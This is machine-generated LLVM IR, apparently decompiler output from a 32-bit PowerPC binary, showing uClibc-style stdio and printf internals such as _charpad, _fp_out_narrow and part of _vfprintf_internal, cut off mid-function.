  %v3_1000d408 = icmp eq i32 %storemerge1, 0
  br i1 %v3_1000d408, label %dec_label_pc_1000d410, label %dec_label_pc_1000d3f0

dec_label_pc_1000d410:                            ; preds = %dec_label_pc_1000d404, %dec_label_pc_1000d3e4
  %v0_1000d420 = phi i32 [ %v0_1000d42016, %dec_label_pc_1000d3e4 ], [ %v0_1000d42017, %dec_label_pc_1000d404 ]
  ret i32 %v0_1000d420

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %v0_1000d3f0, { 0, 1, 3, 2 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000d404, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d398, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %v0_1000d42c = load i32, i32* @r31, align 4
  %v0_1000d430 = load i32, i32* @r3, align 4
  %v1_1000d438 = add i32 %v0_1000d430, 8
  %v2_1000d438 = inttoptr i32 %v1_1000d438 to i32*
  %v3_1000d438 = load i32, i32* %v2_1000d438, align 4
  %v1_1000d43c = add i32 %v0_1000d430, 16
  %v2_1000d43c = inttoptr i32 %v1_1000d43c to i32*
  %v3_1000d43c = load i32, i32* %v2_1000d43c, align 4
  %v2_1000d444 = sub i32 %v3_1000d43c, %v3_1000d438
  store i32 %v2_1000d444, i32* @r5, align 4
  %v5_1000d444 = icmp eq i32 %v2_1000d444, 0
  br i1 %v5_1000d444, label %dec_label_pc_1000d454, label %dec_label_pc_1000d44c

dec_label_pc_1000d44c:                            ; preds = %entry
  store i32 %v3_1000d438, i32* %v2_1000d43c, align 4
  store i32 268489812, i32* @lr, align 4
  %v2_1000d450 = inttoptr i32 %v3_1000d438 to i16*
  %v3_1000d450 = call i32 @__stdio_WRITE(i16* %v2_1000d450, i32 %v2_1000d444)
  %v0_1000d454.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d454

dec_label_pc_1000d454:                            ; preds = %entry, %dec_label_pc_1000d44c
  %v0_1000d454 = phi i32 [ %v0_1000d430, %entry ], [ %v0_1000d454.pre, %dec_label_pc_1000d44c ]
  %v1_1000d454 = add i32 %v0_1000d454, 8
  %v2_1000d454 = inttoptr i32 %v1_1000d454 to i32*
  %v3_1000d454 = load i32, i32* %v2_1000d454, align 4
  %v1_1000d458 = add i32 %v0_1000d454, 16
  %v2_1000d458 = inttoptr i32 %v1_1000d458 to i32*
  %v3_1000d458 = load i32, i32* %v2_1000d458, align 4
  store i32 %v0_1000d42c, i32* @r31, align 4
  %v2_1000d460 = sub i32 %v3_1000d458, %v3_1000d454
  ret i32 %v2_1000d460

; uselistorder directives
  uselistorder i32 %v0_1000d454, { 1, 0 }
  uselistorder i32 %v3_1000d438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d454, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_1000d49c3 = icmp eq i32 %arg3, 0
  %v2_1000d4a0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_1000d49c3, label %dec_label_pc_1000d4bc, label %dec_label_pc_1000d4b0

dec_label_pc_1000d498:                            ; preds = %dec_label_pc_1000d4b0
  %v1_1000d498 = add i32 %v0_1000d498, -1
  store i32 %v1_1000d498, i32* @r31, align 4
  %v3_1000d49c = icmp eq i32 %v1_1000d498, 0
  %v0_1000d4a8 = load i32, i32* @r29, align 4
  br i1 %v3_1000d49c, label %dec_label_pc_1000d4bc.loopexit, label %dec_label_pc_1000d4b0

dec_label_pc_1000d4b0:                            ; preds = %entry, %dec_label_pc_1000d498
  %v0_1000d4a85 = phi i32 [ %v0_1000d4a8, %dec_label_pc_1000d498 ], [ %arg1, %entry ]
  store i32 268489908, i32* @lr, align 4
  %v3_1000d4b0 = inttoptr i32 %v0_1000d4a85 to i16*
  %v4_1000d4b0 = call i32 @__stdio_fwrite(i32 %v2_1000d4a0, i32 1, i16* %v3_1000d4b0)
  %v3_1000d4b4 = icmp eq i32 %v4_1000d4b0, 1
  %v0_1000d498 = load i32, i32* @r31, align 4
  br i1 %v3_1000d4b4, label %dec_label_pc_1000d498, label %dec_label_pc_1000d4bc.loopexit

dec_label_pc_1000d4bc.loopexit:                   ; preds = %dec_label_pc_1000d498, %dec_label_pc_1000d4b0
  %v0_1000d4c0.ph = phi i32 [ %v0_1000d498, %dec_label_pc_1000d4b0 ], [ 0, %dec_label_pc_1000d498 ]
  %v1_1000d4c0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000d4bc

dec_label_pc_1000d4bc:                            ; preds = %dec_label_pc_1000d4bc.loopexit, %entry
  %v1_1000d4c0 = phi i32 [ 0, %entry ], [ %v1_1000d4c0.pre, %dec_label_pc_1000d4bc.loopexit ]
  %v0_1000d4c0 = phi i32 [ 0, %entry ], [ %v0_1000d4c0.ph, %dec_label_pc_1000d4bc.loopexit ]
  %v2_1000d4c0 = sub i32 %v1_1000d4c0, %v0_1000d4c0
  ret i32 %v2_1000d4c0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000d4bc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000d4b0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_1000d4e8 = and i32 %arg2, 128
  %v3_1000d4e8 = icmp eq i32 %v1_1000d4e8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000d4e8, label %dec_label_pc_1000d538, label %dec_label_pc_1000d504

dec_label_pc_1000d504:                            ; preds = %entry
  %v0_1000d504 = call i32 @__GI_strlen()
  %v0_1000d508 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000d504, i32* @r31, align 4
  %v0_1000d510 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000d514 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d514 = sub i32 %v1_1000d514, %v0_1000d504
  store i32 %v2_1000d514, i32* %r29.global-to-local, align 4
  store i32 %v0_1000d504, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1000d514, 1
  br i1 %tmp7, label %dec_label_pc_1000d538, label %dec_label_pc_1000d524

dec_label_pc_1000d524:                            ; preds = %dec_label_pc_1000d504
  %v1_1000d508 = urem i32 %v0_1000d508, 128
  store i32 268490024, i32* @lr, align 4
  %v3_1000d524 = trunc i32 %v1_1000d508 to i8
  %v4_1000d524 = call i32 @_charpad(i32 %v0_1000d510, i8 %v3_1000d524, i32 %v2_1000d514)
  %v0_1000d528 = load i32, i32* @r31, align 4
  store i32 %v0_1000d528, i32* %r30.global-to-local, align 4
  %v1_1000d52c = load i32, i32* @r29, align 4
  %v4_1000d52c = icmp eq i32 %v4_1000d524, %v1_1000d52c
  store i32 %v4_1000d524, i32* @r28, align 4
  br i1 %v4_1000d52c, label %dec_label_pc_1000d524.dec_label_pc_1000d538_crit_edge, label %dec_label_pc_1000d55c

dec_label_pc_1000d524.dec_label_pc_1000d538_crit_edge: ; preds = %dec_label_pc_1000d524
  %v0_1000d544.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1000d538

dec_label_pc_1000d538:                            ; preds = %dec_label_pc_1000d524.dec_label_pc_1000d538_crit_edge, %dec_label_pc_1000d504, %entry
  %v0_1000d544 = phi i32 [ %v0_1000d544.pre, %dec_label_pc_1000d524.dec_label_pc_1000d538_crit_edge ], [ %v0_1000d510, %dec_label_pc_1000d504 ], [ %arg1, %entry ]
  %v0_1000d540 = phi i32 [ %v0_1000d528, %dec_label_pc_1000d524.dec_label_pc_1000d538_crit_edge ], [ %v0_1000d504, %dec_label_pc_1000d504 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1000d540, 1
  br i1 %tmp8, label %dec_label_pc_1000d558, label %dec_label_pc_1000d550

dec_label_pc_1000d550:                            ; preds = %dec_label_pc_1000d538
  %v0_1000d53c = load i32, i32* @r27, align 4
  store i32 268490068, i32* @lr, align 4
  %v3_1000d550 = inttoptr i32 %v0_1000d544 to i16*
  %v4_1000d550 = call i32 @__stdio_fwrite(i32 %v0_1000d53c, i32 %v0_1000d540, i16* %v3_1000d550)
  br label %dec_label_pc_1000d558

dec_label_pc_1000d558:                            ; preds = %dec_label_pc_1000d538, %dec_label_pc_1000d550
  %v1_1000d558 = phi i32 [ 0, %dec_label_pc_1000d538 ], [ %v4_1000d550, %dec_label_pc_1000d550 ]
  %v0_1000d558 = load i32, i32* @r28, align 4
  %v2_1000d558 = add i32 %v0_1000d558, %v1_1000d558
  br label %dec_label_pc_1000d55c

dec_label_pc_1000d55c:                            ; preds = %dec_label_pc_1000d524, %dec_label_pc_1000d558
  %v0_1000d560 = phi i32 [ %v4_1000d524, %dec_label_pc_1000d524 ], [ %v2_1000d558, %dec_label_pc_1000d558 ]
  ret i32 %v0_1000d560

; uselistorder directives
  uselistorder i32 %v0_1000d540, { 1, 0 }
  uselistorder i32 %v2_1000d514, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d55c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d558, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_3()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_3()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1000d578 = load i32, i32* @lr, align 4
  store i32 %v0_1000d578, i32* %r0.global-to-local, align 4
  %v2_1000d580 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1000d580, i32* %r30.global-to-local, align 4
  %v0_1000d584 = load i32, i32* @r3, align 4
  store i32 %v0_1000d584, i32* %r24.global-to-local, align 4
  %v0_1000d590 = load i32, i32* @r5, align 4
  store i32 %v0_1000d590, i32* %r31.global-to-local, align 4
  %v0_1000d594 = load i32, i32* @r4, align 4
  store i32 %v0_1000d594, i32* @r29, align 4
  store i32 268490140, i32* @lr, align 4
  %v1_1000d598 = bitcast i8** %stack_var_-200 to i32*
  %v2_1000d598 = call i32 @_ppfs_init(i32* %v1_1000d598)
  %tmp72 = icmp sgt i32 %v2_1000d598, -1
  br i1 %tmp72, label %dec_label_pc_1000d5cc, label %dec_label_pc_1000d5a4

dec_label_pc_1000d5a4:                            ; preds = %entry
  %v3_1000d5a4 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000d5a4 = ptrtoint i8* %v3_1000d5a4 to i32
  store i32 %v4_1000d5a4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1000d5a4, i32* @r3, align 4
  %v0_1000d5b0 = call i32 @__GI_strlen()
  %v3_1000d5b4 = icmp eq i32 %v0_1000d5b0, 0
  br i1 %v3_1000d5b4, label %dec_label_pc_1000dbcc, label %dec_label_pc_1000d5bc

dec_label_pc_1000d5bc:                            ; preds = %dec_label_pc_1000d5a4
  %v0_1000d5bc = load i32, i32* @r31, align 4
  %v0_1000d5c0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000d5c8.620 to i32), i32* @lr, align 4
  %v3_1000d5c4 = inttoptr i32 %v0_1000d5c0 to i16*
  %v4_1000d5c4 = call i32 @__stdio_fwrite(i32 %v0_1000d5bc, i32 %v0_1000d5b0, i16* %v3_1000d5c4)
  br label %dec_label_pc_1000dbcc

dec_label_pc_1000d5cc:                            ; preds = %entry
  %v0_1000d5d0 = load i32, i32* @r31, align 4
  store i32 268490200, i32* @lr, align 4
  %v2_1000d5d4 = call i32 @_ppfs_prepargs(i32 %v2_1000d580, i32 %v0_1000d5d0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_1000d66c = zext i8 %tmp59 to i32
  %v2_1000d670 = icmp sgt i32 %tmp60, 0
  %v2_1000d674 = ptrtoint i32* %stack_var_-112 to i32
  %v2_1000d698 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1000d69c = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_1000d6d0 = icmp eq i32 %tmp57, 0
  %v2_1000da2c = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000d94c = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000d950 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1000d7c4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000d8a0 = icmp eq i32 %tmp57, 1
  %v2_1000d844 = icmp ugt i32 %tmp57, 2
  %v4_1000d784 = zext i8 %tmp55 to i32
  %v0_1000dbb8.pre = load i32, i32* @r29, align 4
  %v1_1000d684 = mul nuw nsw i32 %v4_1000d66c, 8
  %v2_1000d688 = add i32 %v2_1000d674, %v1_1000d684
  %v1_1000d68c = add i32 %v2_1000d688, -8
  %v1_1000d6a0 = add i32 %tmp58, 1
  %v2_1000d6f8 = icmp ugt i32 %tmp57, 7
  %v2_1000d8d8 = icmp ugt i32 %tmp57, 15
  %v2_1000d90c = icmp ugt i32 %tmp57, 17
  %v3_1000d90c = icmp eq i32 %tmp57, 17
  %v2_1000d9b4 = icmp ugt i32 %tmp57, 19
  %v3_1000d9b4 = icmp eq i32 %tmp57, 19
  %v3_1000da20 = icmp eq i32 %tmp57, 20
  %v1_1000d710 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_100171c0.622 to i32), i32 -1)
  %v2_1000d710 = inttoptr i32 %v1_1000d710 to i8*
  %v3_1000d850 = icmp eq i32 %tmp57, 3
  %v3_1000d860 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000dbb8

dec_label_pc_1000d5e4.backedge:                   ; preds = %dec_label_pc_1000d638, %dec_label_pc_1000d5f0
  %storemerge13.in = phi i32 [ %v1_1000d600, %dec_label_pc_1000d5f0 ], [ %v1_1000d638, %dec_label_pc_1000d638 ]
  %v1_1000d5f816 = phi i32 [ %v0_1000d610, %dec_label_pc_1000d5f0 ], [ %v1_1000d638, %dec_label_pc_1000d638 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_1000d5e4

dec_label_pc_1000d5e4:                            ; preds = %dec_label_pc_1000d5e4.backedge, %dec_label_pc_1000dbb8
  %v0_1000d610 = phi i32 [ %v1_1000d5f816, %dec_label_pc_1000d5e4.backedge ], [ %v0_1000dbb8, %dec_label_pc_1000dbb8 ]
  %v1_1000d600 = phi i32 [ %storemerge13, %dec_label_pc_1000d5e4.backedge ], [ %v0_1000dbb8, %dec_label_pc_1000dbb8 ]
  %v1_1000d5e4 = inttoptr i32 %v1_1000d600 to i8*
  %v2_1000d5e4 = load i8, i8* %v1_1000d5e4, align 1
  %v3_1000d5e4 = zext i8 %v2_1000d5e4 to i32
  store i32 %v3_1000d5e4, i32* %r0.global-to-local, align 4
  %v3_1000d5e8 = icmp eq i8 %v2_1000d5e4, 0
  br i1 %v3_1000d5e8, label %dec_label_pc_1000d5f8, label %dec_label_pc_1000d5f0

dec_label_pc_1000d5f0:                            ; preds = %dec_label_pc_1000d5e4
  %v3_1000d5f0 = icmp eq i8 %v2_1000d5e4, 37
  br i1 %v3_1000d5f0, label %dec_label_pc_1000d5f8, label %dec_label_pc_1000d5e4.backedge

dec_label_pc_1000d5f8:                            ; preds = %dec_label_pc_1000d5f0, %dec_label_pc_1000d5e4
  %v4_1000d5f8 = icmp eq i32 %v1_1000d600, %v0_1000d610
  br i1 %v4_1000d5f8, label %dec_label_pc_1000d62c, label %dec_label_pc_1000d600

dec_label_pc_1000d600:                            ; preds = %dec_label_pc_1000d5f8
  %v2_1000d600 = sub i32 %v1_1000d600, %v0_1000d610
  store i32 %v2_1000d600, i32* @r31, align 4
  %v4_1000d600 = icmp sgt i32 %v2_1000d600, 0
  br i1 %v4_1000d600, label %dec_label_pc_1000d610, label %dec_label_pc_1000d620

dec_label_pc_1000d610:                            ; preds = %dec_label_pc_1000d600
  %v0_1000d618 = load i32, i32* %r24.global-to-local, align 4
  store i32 268490272, i32* @lr, align 4
  %v3_1000d61c = inttoptr i32 %v0_1000d618 to i16*
  %v4_1000d61c = call i32 @__stdio_fwrite(i32 %v0_1000d610, i32 %v2_1000d600, i16* %v3_1000d61c)
  %v1_1000d620.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000d620

dec_label_pc_1000d620:                            ; preds = %dec_label_pc_1000d600, %dec_label_pc_1000d610
  %v1_1000d628 = phi i32 [ %v1_1000d620.pre, %dec_label_pc_1000d610 ], [ %v2_1000d600, %dec_label_pc_1000d600 ]
  %storemerge2 = phi i32 [ %v4_1000d61c, %dec_label_pc_1000d610 ], [ 0, %dec_label_pc_1000d600 ]
  %v4_1000d620 = icmp eq i32 %storemerge2, %v1_1000d628
  br i1 %v4_1000d620, label %dec_label_pc_1000d628, label %dec_label_pc_1000dbc8

dec_label_pc_1000d628:                            ; preds = %dec_label_pc_1000d620
  %v0_1000d628 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000d628 = add i32 %v0_1000d628, %v1_1000d628
  store i32 %v2_1000d628, i32* %r23.global-to-local, align 4
  %v0_1000d62c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000d62c

dec_label_pc_1000d62c:                            ; preds = %dec_label_pc_1000d5f8, %dec_label_pc_1000d628
  %v0_1000d638 = phi i32 [ %v0_1000d610, %dec_label_pc_1000d5f8 ], [ %v0_1000d62c.pre, %dec_label_pc_1000d628 ]
  %v1_1000d62c = inttoptr i32 %v0_1000d638 to i8*
  %v2_1000d62c = load i8, i8* %v1_1000d62c, align 1
  %v3_1000d62c = zext i8 %v2_1000d62c to i32
  store i32 %v3_1000d62c, i32* %r0.global-to-local, align 4
  %v3_1000d630 = icmp eq i8 %v2_1000d62c, 0
  br i1 %v3_1000d630, label %dec_label_pc_1000dbcc, label %dec_label_pc_1000d638

dec_label_pc_1000d638:                            ; preds = %dec_label_pc_1000d62c
  %v1_1000d638 = add i32 %v0_1000d638, 1
  %v2_1000d638 = inttoptr i32 %v1_1000d638 to i8*
  %v3_1000d638 = load i8, i8* %v2_1000d638, align 1
  %v4_1000d638 = zext i8 %v3_1000d638 to i32
  store i32 %v4_1000d638, i32* %r0.global-to-local, align 4
  %v3_1000d640 = icmp eq i8 %v3_1000d638, 37
  br i1 %v3_1000d640, label %dec_label_pc_1000d5e4.backedge, label %dec_label_pc_1000d648

dec_label_pc_1000d648:                            ; preds = %dec_label_pc_1000d638
  store i32 %v2_1000d580, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1000d638, i8** %stack_var_-200, align 4
  store i32 268490336, i32* @lr, align 4
  %v3_1000d65c = call i32 @_ppfs_parsespec(i32* %v1_1000d598, i32 %v1_1000d638)
  store i32 %v2_1000d580, i32* @r3, align 4
  store i32 268490344, i32* @lr, align 4
  %v0_1000d664 = call i32 @_ppfs_setargs()
  store i32 %v4_1000d66c, i32* @r7, align 4
  store i32 %v2_1000d674, i32* %r0.global-to-local, align 4
  br i1 %v2_1000d670, label %dec_label_pc_1000d684, label %dec_label_pc_1000d690

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d648
  br label %dec_label_pc_1000d690

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d648, %dec_label_pc_1000d684
  %v0_1000d6bc82 = phi i32 [ %v1_1000d68c, %dec_label_pc_1000d684 ], [ %v2_1000d674, %dec_label_pc_1000d648 ]
  store i32 %v0_1000d6bc82, i32* %r10.global-to-local, align 4
  store i32 %v2_1000d698, i32* @r8, align 4
  store i32 %v1_1000d6a0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1000d6c0.preheader, label %dec_label_pc_1000d6c0.preheader.thread

dec_label_pc_1000d6c0.preheader.thread:           ; preds = %dec_label_pc_1000d690
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d6cc

dec_label_pc_1000d6c0.preheader:                  ; preds = %dec_label_pc_1000d690
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1000d69c, label %dec_label_pc_1000d6cc, label %dec_label_pc_1000d6b8.preheader

dec_label_pc_1000d6b8.preheader:                  ; preds = %dec_label_pc_1000d6c0.preheader
  store i32 %v0_1000d6bc82, i32* %stack_var_-344, align 4
  %v1_1000d6bc83 = add i32 %v0_1000d6bc82, 8
  store i32 %v1_1000d6bc83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1000d6c888 = add i32 %tmp58, -1
  store i32 %v1_1000d6c888, i32* %ctr.global-to-local, align 4
  %v2_1000d6c889 = icmp eq i32 %v1_1000d6c888, 0
  br i1 %v2_1000d6c889, label %dec_label_pc_1000d6cc, label %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge

dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge: ; preds = %dec_label_pc_1000d6b8.preheader, %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge
  %v1_1000d6b8.pre = phi i32 [ %v1_1000d6b8.pre.pre, %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge ], [ %v2_1000d698, %dec_label_pc_1000d6b8.preheader ]
  %v1_1000d6c091 = phi i32 [ %v1_1000d6c0, %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge ], [ 4, %dec_label_pc_1000d6b8.preheader ]
  %v1_1000d6bc90 = phi i32 [ %v1_1000d6bc, %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge ], [ %v1_1000d6bc83, %dec_label_pc_1000d6b8.preheader ]
  %v3_1000d6b8 = add i32 %v1_1000d6b8.pre, %v1_1000d6c091
  %v4_1000d6b8 = inttoptr i32 %v3_1000d6b8 to i32*
  store i32 %v1_1000d6bc90, i32* %v4_1000d6b8, align 4
  %v0_1000d6bc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d6bc = add i32 %v0_1000d6bc, 8
  store i32 %v1_1000d6bc, i32* %r10.global-to-local, align 4
  %v0_1000d6c0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d6c0 = mul i32 %v0_1000d6c0, 4
  store i32 %v1_1000d6c0, i32* %r0.global-to-local, align 4
  %v1_1000d6c4 = add i32 %v0_1000d6c0, 1
  store i32 %v1_1000d6c4, i32* %r11.global-to-local, align 4
  %v0_1000d6c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6c8 = add i32 %v0_1000d6c8, -1
  store i32 %v1_1000d6c8, i32* %ctr.global-to-local, align 4
  %v2_1000d6c8 = icmp eq i32 %v1_1000d6c8, 0
  br i1 %v2_1000d6c8, label %dec_label_pc_1000d6cc, label %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge

dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge.dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge_crit_edge: ; preds = %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge
  %v1_1000d6b8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge

dec_label_pc_1000d6cc:                            ; preds = %dec_label_pc_1000d6b8.preheader, %dec_label_pc_1000d6b8.dec_label_pc_1000d6b8_crit_edge, %dec_label_pc_1000d6c0.preheader.thread, %dec_label_pc_1000d6c0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_1000d6d0, label %dec_label_pc_1000d6d8, label %dec_label_pc_1000d6f8

dec_label_pc_1000d6d8:                            ; preds = %dec_label_pc_1000d6cc
  %v0_1000d6dc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000d6dc, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_1000d6dc, 0
  %v1_1000d6e4 = zext i1 %tmp96 to i32
  %v2_1000d6e4 = ashr i32 %v0_1000d6dc, 31
  %v3_1000d6e4 = and i32 %v2_1000d6e4, -2
  %v4_1000d6e4 = or i32 %v3_1000d6e4, %v1_1000d6e4
  store i32 %v4_1000d6e4, i32* @r5, align 4
  %v1_1000d6ec = call i32 @__asm_rlwinm(i32 %v0_1000d80c, i32 0, i32 20, i32 23)
  store i32 %v1_1000d6ec, i32* @r4, align 4
  %v1_1000d6f0 = inttoptr i32 %v1_1000d6ec to i16*
  %v2_1000d6f0 = call i32 @_store_inttype(i16* %v1_1000d6f0)
  br label %dec_label_pc_1000dbb4

dec_label_pc_1000d6f8:                            ; preds = %dec_label_pc_1000d6cc
  br i1 %v2_1000d6f8, label %dec_label_pc_1000d8d8, label %dec_label_pc_1000d700

dec_label_pc_1000d700:                            ; preds = %dec_label_pc_1000d6f8
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1000d710 = load i8, i8* %v2_1000d710, align 1
  %v4_1000d710 = zext i8 %v3_1000d710 to i32
  store i32 %v4_1000d710, i32* %r30.global-to-local, align 4
  %v3_1000d714 = icmp eq i8 %v3_1000d710, 10
  br i1 %v3_1000d714, label %dec_label_pc_1000d71c, label %dec_label_pc_1000d744

dec_label_pc_1000d71c:                            ; preds = %dec_label_pc_1000d700
  store i32 %v0_1000d80c, i32* %r0.global-to-local, align 4
  %v1_1000d720 = call i32 @__asm_rlwinm(i32 %v0_1000d80c, i32 26, i32 31, i32 31)
  %v1_1000d724 = call i32 @__asm_rlwinm(i32 %v0_1000d80c, i32 27, i32 31, i32 31)
  %v3_1000d728 = icmp eq i32 %v1_1000d720, 0
  %v2_1000d72c = icmp ne i32 %v1_1000d724, 0
  %not.v2_1000d72c = xor i1 %v2_1000d72c, true
  %v6_1000d730 = sext i1 %not.v2_1000d72c to i32
  store i32 %v6_1000d730, i32* %r0.global-to-local, align 4
  %v1_1000d738 = select i1 %v2_1000d72c, i32 44, i32 87
  store i32 %v1_1000d738, i32* %r31.global-to-local, align 4
  br i1 %v3_1000d728, label %dec_label_pc_1000d744, label %dec_label_pc_1000d740

dec_label_pc_1000d740:                            ; preds = %dec_label_pc_1000d71c
  %v1_1000d740 = or i32 %v1_1000d738, 128
  store i32 %v1_1000d740, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d744

dec_label_pc_1000d744:                            ; preds = %dec_label_pc_1000d700, %dec_label_pc_1000d71c, %dec_label_pc_1000d740
  %v0_1000d744 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000d744 = icmp ugt i32 %v0_1000d744, 5
  br i1 %v2_1000d744, label %dec_label_pc_1000d76c, label %dec_label_pc_1000d74c

dec_label_pc_1000d74c:                            ; preds = %dec_label_pc_1000d744
  %v3_1000d74c = icmp eq i32 %v0_1000d744, 3
  br i1 %v3_1000d74c, label %dec_label_pc_1000d754, label %dec_label_pc_1000d75c

dec_label_pc_1000d754:                            ; preds = %dec_label_pc_1000d74c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d770

dec_label_pc_1000d75c:                            ; preds = %dec_label_pc_1000d74c
  %v3_1000d75c = icmp eq i32 %v0_1000d744, 1
